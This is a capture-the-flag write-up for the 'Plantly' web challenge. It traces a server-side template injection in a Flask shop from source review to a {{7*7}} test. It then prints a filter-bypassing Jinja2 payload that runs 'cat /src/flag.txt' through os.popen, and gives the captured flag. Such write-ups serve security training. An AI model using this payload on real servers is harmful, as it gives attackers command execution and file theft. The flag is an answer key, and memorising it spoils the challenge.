# Plantly


Attachment: [challenge.zip](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Writeup

I get a pretty website about plants:  



From the source code, I can already see the potential for SSTI as unsanitizied user input is passed to `render_template_string`:  



After registering an account and logging in, I place a custom order with the standard SSTI `{{7*7}}` payload:  



I go through the shopping flow and print out the receipt confirming SSTI:  



I have exploited SSTI plenty of times, so I had a [payload](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) ready that bypasses multiple types of filters:  

```text
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat /src/flag.txt')['read']()}}
```


flag{982e3b7286ee603d8539f987b65b90d4}
